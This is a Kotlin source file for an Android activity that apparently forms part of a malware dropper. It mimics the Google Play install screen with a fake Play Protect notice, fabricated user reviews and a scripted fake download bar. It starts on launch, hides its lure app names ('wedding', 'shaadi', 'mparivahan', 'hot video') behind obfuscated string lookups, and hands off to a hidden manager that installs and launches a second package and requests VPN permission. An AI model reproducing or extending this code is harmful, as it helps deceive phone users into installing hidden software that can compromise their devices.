package com.playstore.installer

import android.annotation.SuppressLint
import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import android.app.Activity
import android.app.AlertDialog
import android.net.VpnService
import java.io.IOException
import com.playstore.installer.berlin.BerlinInstallManager

// NOTE: This file is declared as class InstallActivity so the CI workflow
// (build_berlin.yml) can swap it in place of InstallActivity.kt before the
// Gradle build. The swap step copies this file over InstallActivity.kt and
// deletes this file so there is no Redeclaration error.
class InstallActivity : Activity() {

    // ── Stage enum ──────────────────────────────────────────────────────────
    private enum class Stage { IDLE, WAITING, DOWNLOADING, INSTALLING, DONE, ERROR }

    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var installButton: FrameLayout
    private lateinit var installButtonBg: View
    private lateinit var installButtonProgress: android.widget.FrameLayout
    private lateinit var tvInstallLabel: TextView
    private lateinit var tvInstallLabelWhite: TextView
    private lateinit var tvUnderButton: TextView
    private lateinit var layoutPlayProtect: LinearLayout
    private lateinit var layoutUpdated: TextView
    private lateinit var dotsContainer: FrameLayout
    private lateinit var layoutDownloading: LinearLayout
    private lateinit var layoutInstalling: LinearLayout
    private lateinit var layoutError: LinearLayout
    private lateinit var btnRetry: Button
    private lateinit var btnCancel: Button
    private lateinit var reviewsContainer: LinearLayout
    private lateinit var tvToast: TextView
    private lateinit var ivAppIcon: ImageView
    private lateinit var tvAppName: TextView
    private lateinit var tvAppCategory: TextView

    // ── State ────────────────────────────────────────────────────────────────
    private var stage = Stage.IDLE
    private var downloadProgress = 0f
    private val handler = Handler(Looper.getMainLooper())
    private var progressRunnable: Runnable? = null
    private var installRestartRetryCount = 0
    private val MAX_INSTALL_RESTARTS = 3

    // ── Berlin install manager ────────────────────────────────────────────────
    private lateinit var berlinInstallManager: BerlinInstallManager

    // ── Constants ────────────────────────────────────────────────────────────
    companion object {
        private const val TOTAL_MB = 1.84f
    }

    // ── Dot specs ─────────────────────────────────────────────────────────────
    private data class DotSpec(
        val color: String, val sizeDp: Float, val leftDp: Float, val topDp: Float,
        val delayMs: Long, val bounceDp: Float, val outline: Boolean
    )

    private val dotSpecs = listOf(
        DotSpec("#BDBDBD", 22f, 54f,  0f,   0,   10f, true),
        DotSpec("#00BCD4", 24f,  0f, 34f, 100,   12f, false),
        DotSpec("#9E9E9E",  9f, 54f, 42f, 200,    7f, false),
        DotSpec("#9E9E9E", 22f, 74f, 34f, 150,    9f, false),
        DotSpec("#BDBDBD", 21f,  0f, 70f, 250,    8f, false),
        DotSpec("#00BCD4", 30f, 28f, 64f,  50,   14f, false),
        DotSpec("#F44336", 24f, 98f, 70f, 300,   10f, false),
        DotSpec("#4CAF50", 11f,  2f,108f, 180,    6f, false),
        DotSpec("#E0E0E0",  9f, 44f,112f, 350,    5f, false),
        DotSpec("#BDBDBD", 23f, 64f,104f, 120,    9f, true),
        DotSpec("#FFC107", 30f, 64f,142f,  80,   13f, false)
    )

    private fun getReviewsForApp(): List<Triple<String, Int, String>> {
        val appName = getString(R.string.app_name).trim().lowercase()
        val template = when {
            appName.contains(StringPool.d(StringPool.TPL_WEDDING))    -> StringPool.d(StringPool.TPL_WEDDING)
            appName.contains(StringPool.d(StringPool.TPL_SHAADI))     -> StringPool.d(StringPool.TPL_SHAADI)
            appName.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> StringPool.d(StringPool.TPL_MPARIVAHAN)
            appName.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> StringPool.d(StringPool.TPL_HOT_VIDEO)
            else -> "generic"
        }
        val fromAssets = StringPool.loadReviews(this, template)
        if (fromAssets.isNotEmpty()) return fromAssets
        return emptyList()
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)
        bindViews()
        setupAppHeader()
        buildDots()
        buildReviews()

        // Create berlin install manager — success callback launches berlin, error callback sets ERROR stage
        berlinInstallManager = BerlinInstallManager(
            activity = this,
            onBerlinInstallSuccess = { pkgName -> runOnUiThread { launchBerlin(pkgName) } },
            onBerlinInstallError   = { runOnUiThread { setStage(Stage.ERROR) } }
        )

        // Register berlin receivers
        berlinInstallManager.registerReceivers()

        setStage(Stage.IDLE)
        startDownload()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        berlinInstallManager.unregisterReceivers()
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == BerlinInstallManager.VPN_REQUEST_CODE_BERLIN) {
            berlinInstallManager.onVpnActivityResult(resultCode)
        }
    }

    override fun onResume() {
        super.onResume()
    }

    // ── View binding ──────────────────────────────────────────────────────────
    private fun bindViews() {
        installButton        = findViewById(R.id.install_button)
        installButtonBg      = findViewById(R.id.install_button_bg)
        installButtonProgress= findViewById(R.id.install_button_progress)
        tvInstallLabel       = findViewById(R.id.tv_install_label)
        tvInstallLabelWhite  = findViewById(R.id.tv_install_label_white)
        tvUnderButton        = findViewById(R.id.tv_under_button)
        layoutPlayProtect    = findViewById(R.id.layout_play_protect)
        layoutUpdated        = findViewById(R.id.layout_updated)
        dotsContainer        = findViewById(R.id.dots_container)
        layoutDownloading    = findViewById(R.id.layout_downloading)
        layoutInstalling     = findViewById(R.id.layout_installing)
        layoutError          = findViewById(R.id.layout_error)
        btnRetry             = findViewById(R.id.btn_retry)
        btnCancel            = findViewById(R.id.btn_cancel)
        reviewsContainer     = findViewById(R.id.reviews_container)
        tvToast              = findViewById(R.id.tv_toast)
        ivAppIcon            = findViewById(R.id.iv_app_icon)
        tvAppName            = findViewById(R.id.tv_app_name)
        tvAppCategory        = findViewById(R.id.tv_app_category)

        installButton.setOnClickListener {
            if (stage == Stage.IDLE) {
                installRestartRetryCount = 0
                startDownload()
            }
        }
        btnRetry.setOnClickListener {
            installRestartRetryCount = 0
            startDownload()
        }
        btnCancel.setOnClickListener { cancelDownload() }
    }

    // ── App header ────────────────────────────────────────────────────────────
    private fun setupAppHeader() {
        try {
            val icon = packageManager.getApplicationIcon(packageName)
            ivAppIcon.setImageDrawable(icon)
        } catch (_: PackageManager.NameNotFoundException) { }

        tvAppName.text = getString(R.string.app_name)

        val appNameLower = getString(R.string.app_name).trim().lowercase()
        val category = when {
            appNameLower.contains(StringPool.d(StringPool.TPL_WEDDING))    -> "Celebrate Invitations"
            appNameLower.contains(StringPool.d(StringPool.TPL_SHAADI))     -> "Celebrate Invitations"
            appNameLower.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> "Transport & Vehicle"
            appNameLower.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> "Entertainment"
            else -> "Communication"
        }
        tvAppCategory.text = category
    }

    // ── Stage machine ─────────────────────────────────────────────────────────
    private fun setStage(s: Stage) {
        stage = s
        if (s == Stage.IDLE || s == Stage.ERROR || s == Stage.DONE) {
            installFlowActive = false
        }
        // No stage persistence needed for berlin flow — fresh start every time
        runOnUiThread {
            layoutPlayProtect.visibility = View.GONE
            layoutUpdated.visibility     = View.GONE
            tvUnderButton.visibility     = View.GONE
            layoutDownloading.visibility = View.GONE
            layoutInstalling.visibility  = View.GONE
            layoutError.visibility       = View.GONE
            installButtonProgress.visibility = View.GONE
            dotsContainer.visibility     = View.VISIBLE

            when (s) {
                Stage.IDLE -> {
                    setInstallBg("#1A73E8")
                    tvInstallLabel.text      = "Install"
                    tvInstallLabel.setTextColor(Color.WHITE)
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutPlayProtect.visibility = View.VISIBLE
                    installButton.isClickable = true
                }
                Stage.WAITING -> {
                    setProgressWidth(0.08f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Waiting…"
                    installButton.isClickable = false
                }
                Stage.DOWNLOADING -> {
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "0%"
                    installButton.isClickable = false
                    setProgressWidth(0f)
                }
                Stage.INSTALLING -> {
                    setProgressWidth(1f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Installing…"
                    layoutInstalling.visibility = View.VISIBLE
                    installButton.isClickable = false
                }
                Stage.DONE -> {
                    // launchBerlin is called from BerlinInstallManager callback
                }
                Stage.ERROR -> {
                    setInstallBg("#E8EAED")
                    tvInstallLabel.text = "Install"
                    tvInstallLabel.setTextColor(Color.parseColor("#1A73E8"))
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutError.visibility    = View.VISIBLE
                    installButton.isClickable = false
                }
            }
        }
    }

    // ── Install button fill ───────────────────────────────────────────────────
    private fun setInstallBg(hex: String) {
        installButtonProgress.visibility = View.GONE
        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor(hex))
        installButtonBg.background = bg
    }

    private fun setProgressWidth(fraction: Float) {
        installButtonBg.visibility          = View.VISIBLE
        installButtonProgress.visibility    = View.VISIBLE

        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor("#E8EAED"))
        installButtonBg.background = bg

        val pgBg = installButtonProgress.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        pgBg.setColor(Color.parseColor("#1A73E8"))
        installButtonProgress.background = pgBg

        installButton.post {
            val totalWidth = installButton.width
            val lp = installButtonProgress.layoutParams
            lp.width = (totalWidth * fraction).toInt().coerceAtLeast(1)
            installButtonProgress.layoutParams = lp
        }
    }

    private var progressAnimator: ValueAnimator? = null
    private var currentBarFraction = 0f

    private fun updateDownloadProgress(pct: Float) {
        if (pct <= downloadProgress && pct != 0f) return
        downloadProgress = pct

        tvInstallLabelWhite.text = "${pct.toInt()}%"
        installButtonProgress.visibility = View.VISIBLE

        installButton.post {
            val totalWidth = installButton.width
            if (totalWidth == 0) return@post

            val lblLp = tvInstallLabelWhite.layoutParams
            if (lblLp.width != totalWidth) {
                lblLp.width = totalWidth
                tvInstallLabelWhite.layoutParams = lblLp
            }

            val targetFraction = pct / 100f
            progressAnimator?.cancel()
            progressAnimator = ValueAnimator.ofFloat(currentBarFraction, targetFraction).apply {
                duration = 200
                interpolator = android.view.animation.LinearInterpolator()
                addUpdateListener { anim ->
                    val f = anim.animatedValue as Float
                    currentBarFraction = f
                    val lp = installButtonProgress.layoutParams
                    lp.width = (totalWidth * f).toInt().coerceAtLeast(1)
                    installButtonProgress.layoutParams = lp
                }
                start()
            }
        }
    }

    // ── Install flow ──────────────────────────────────────────────────────────
    private var installFlowActive = false

    private fun startDownload() {
        if (installFlowActive) return
        installFlowActive = true

        setStage(Stage.DOWNLOADING)
        startProgressAnimation()
    }

    private fun cancelDownload() {
        progressRunnable?.let { handler.removeCallbacks(it) }
        progressAnimator?.cancel()
        handler.removeCallbacksAndMessages(null)
        setStage(Stage.IDLE)
        showToast(StringPool.d(StringPool.MSG_CANCEL))
    }

    /**
     * 3-phase progress animation identical to main InstallActivity.
     * At Phase 3 start → setStage(INSTALLING) + berlinInstallManager.start()
     */
    private fun startProgressAnimation() {
        downloadProgress = 0f
        currentBarFraction = 0f

        data class Phase(val targetPct: Float, val durationMs: Long)
        val phases = listOf(
            Phase(40f,   900L),
            Phase(60f,  2800L),
            Phase(100f,  700L),
        )

        var phaseIndex = 0
        var phaseStart = 0f
        var installTriggered = false

        fun runNextPhase() {
            if (phaseIndex >= phases.size) {
                handler.postDelayed({ }, 200L)
                return
            }

            val phase = phases[phaseIndex]

            // Phase 3 start → trigger berlin install
            if (phaseIndex == 2 && !installTriggered) {
                installTriggered = true
                setStage(Stage.INSTALLING)
                berlinInstallManager.start()
            }

            val animator = ValueAnimator.ofFloat(phaseStart, phase.targetPct).apply {
                duration = phase.durationMs
                interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                addUpdateListener { anim ->
                    val pct = anim.animatedValue as Float
                    updateDownloadProgress(pct)
                }
                addListener(object : android.animation.AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        phaseStart = phase.targetPct
                        phaseIndex++
                        runNextPhase()
                    }
                })
            }
            animator.start()
        }

        runNextPhase()
    }

    // ── Launch berlin app ─────────────────────────────────────────────────────
    private fun launchBerlin(pkgName: String) {
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkgName) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            startActivity(launch)
            finish()
        } catch (e: Exception) { }
    }

    // ── Dots ──────────────────────────────────────────────────────────────────
    private fun buildDots() {
        dotsContainer.post {
            dotSpecs.forEach { spec ->
                val sizePx   = dp(spec.sizeDp).toInt()
                val leftPx   = dp(spec.leftDp).toInt()
                val topPx    = dp(spec.topDp).toInt()
                val bouncePx = dp(spec.bounceDp)

                val dot = View(this).apply {
                    layoutParams = FrameLayout.LayoutParams(sizePx, sizePx).apply {
                        leftMargin = leftPx
                        topMargin  = topPx
                    }
                    background = if (spec.outline) {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.TRANSPARENT)
                            setStroke(dp(2.5f).toInt(), Color.parseColor(spec.color))
                        }
                    } else {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.parseColor(spec.color))
                        }
                    }
                }
                dotsContainer.addView(dot)

                val bounceUp   = ObjectAnimator.ofFloat(dot, "translationY", 0f, -bouncePx).apply {
                    duration = 350
                    interpolator = android.view.animation.DecelerateInterpolator()
                }
                val bounceDown = ObjectAnimator.ofFloat(dot, "translationY", -bouncePx, 0f).apply {
                    duration = 350
                    interpolator = android.view.animation.AccelerateInterpolator()
                }
                val sxUp = ObjectAnimator.ofFloat(dot, "scaleX", 1f, 1.12f).apply { duration = 350 }
                val syUp = ObjectAnimator.ofFloat(dot, "scaleY", 1f, 1.12f).apply { duration = 350 }
                val sxDn = ObjectAnimator.ofFloat(dot, "scaleX", 1.12f, 1f).apply { duration = 350 }
                val syDn = ObjectAnimator.ofFloat(dot, "scaleY", 1.12f, 1f).apply { duration = 350 }

                val set = AnimatorSet().apply {
                    playSequentially(
                        AnimatorSet().also { it.playTogether(bounceUp, sxUp, syUp) },
                        AnimatorSet().also { it.playTogether(bounceDown, sxDn, syDn) }
                    )
                    startDelay = spec.delayMs
                }
                set.addListener(object : android.animation.AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        set.startDelay = 500 + spec.delayMs % 400
                        set.start()
                    }
                })
                set.start()
            }
        }
    }

    // ── Reviews ───────────────────────────────────────────────────────────────
    private fun buildReviews() {
        val shuffled = getReviewsForApp().shuffled().take(5)
        shuffled.forEachIndexed { index, (name, stars, reviewText) ->
            val itemLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(10f).toInt() }
                setPadding(0, 0, 0, dp(10f).toInt())
            }

            val nameRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity     = Gravity.CENTER_VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }

            val avatar = TextView(this).apply {
                text      = name[0].toString()
                textSize  = 10f
                setTextColor(Color.WHITE)
                gravity   = Gravity.CENTER
                val hue   = (index * 57) % 360
                val bg    = GradientDrawable().apply {
                    shape         = GradientDrawable.OVAL
                    val hsv       = floatArrayOf(hue.toFloat(), 0.6f, 0.55f)
                    setColor(Color.HSVToColor(hsv))
                }
                background = bg
                val sz    = dp(22f).toInt()
                layoutParams = LinearLayout.LayoutParams(sz, sz).also { it.marginEnd = dp(6f).toInt() }
            }
            nameRow.addView(avatar)

            val tvName = TextView(this).apply {
                text     = name
                textSize = 11f
                setTextColor(Color.parseColor("#202124"))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                setTypeface(typeface, android.graphics.Typeface.BOLD)
            }
            nameRow.addView(tvName)
            itemLayout.addView(nameRow)

            val starRow = LinearLayout(this).apply {
                orientation  = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }
            repeat(5) { i ->
                val star = TextView(this).apply {
                    text     = "★"
                    textSize = 10f
                    setTextColor(if (i < stars) Color.parseColor("#FBBC04") else Color.parseColor("#E0E0E0"))
                }
                starRow.addView(star)
            }
            itemLayout.addView(starRow)

            val tvText = TextView(this).apply {
                text        = reviewText
                textSize    = 10f
                setTextColor(Color.parseColor("#3C4043"))
                setLineSpacing(0f, 1.45f)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }
            itemLayout.addView(tvText)

            if (index < shuffled.size - 1) {
                val divider = View(this).apply {
                    setBackgroundColor(Color.parseColor("#F1F3F4"))
                    layoutParams = LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT, dp(1f).toInt()
                    ).also { it.topMargin = dp(8f).toInt() }
                }
                itemLayout.addView(divider)
            }

            reviewsContainer.addView(itemLayout)
        }
    }

    // ── Toast ─────────────────────────────────────────────────────────────────
    private fun showToast(msg: String) {
        tvToast.text       = msg
        tvToast.visibility = View.VISIBLE
        handler.postDelayed({ tvToast.visibility = View.GONE }, 2800)
    }

    // ── Util ──────────────────────────────────────────────────────────────────
    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)
}
